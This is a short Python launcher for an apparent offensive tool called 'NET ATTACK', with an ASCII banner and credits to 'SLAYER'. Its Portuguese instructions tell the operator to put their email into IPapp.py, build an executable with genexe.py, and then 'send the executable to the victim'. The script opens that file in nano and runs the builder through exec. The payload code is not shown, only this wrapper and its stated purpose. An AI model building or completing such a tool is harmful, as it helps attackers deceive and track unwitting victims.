import os, time, sys
os.system('cls')
#os.system('clear')
verde = '\033[32m'
vermelho = '\033[31m'
nulo = '\033[0m'
print (f'''
{verde}███╗░░██╗███████╗████████╗{nulo}    {vermelho}░█████╗░████████╗░█████╗░░█████╗░██╗░░██╗{nulo}
{verde}████╗░██║██╔════╝╚══██╔══╝{nulo}    {vermelho}██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝{nulo}
{verde}██╔██╗██║█████╗░░░░░██║░░░{nulo}    {vermelho}███████║░░░██║░░░███████║██║░░╚═╝█████═╝░{nulo}
{verde}██║╚████║██╔══╝░░░░░██║░░░{nulo}    {vermelho}██╔══██║░░░██║░░░██╔══██║██║░░██╗██╔═██╗░{nulo}
{verde}██║░╚███║███████╗░░░██║░░░{nulo}    {vermelho}██║░░██║░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗{nulo}
{verde}╚═╝░░╚══╝╚══════╝░░░╚═╝░░░{nulo}    {vermelho}╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝{nulo}''')
time.sleep(0.50)
z = '''BY: SLAYER
Github: https://github.com/CY-LUGH-TOOLS
creator's github: https://github.com/slayerkk'''

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.05)
print('')
print('em 10 segundos, ira abrir o none, adicione o seu email e crie o executavel executando o comando abaixo. apos isso mande o executavel para a vitima')

time.sleep(8)

os.system('nano IPapp.py')

escolha = -1

while escolha < 00 or escolha > 99:
    escolha = int(input("""
[ 1 ] = criar executavel
\033[0;30;34m┌──(CY㉿LUGH!)-[~]
└─>\033[0;30;0m """))
    print(''' ''')
    print('')
    print('')
    
# escolha

if escolha == 1:
    exec(open('genexe.py', encoding="utf-8").read(), globals())


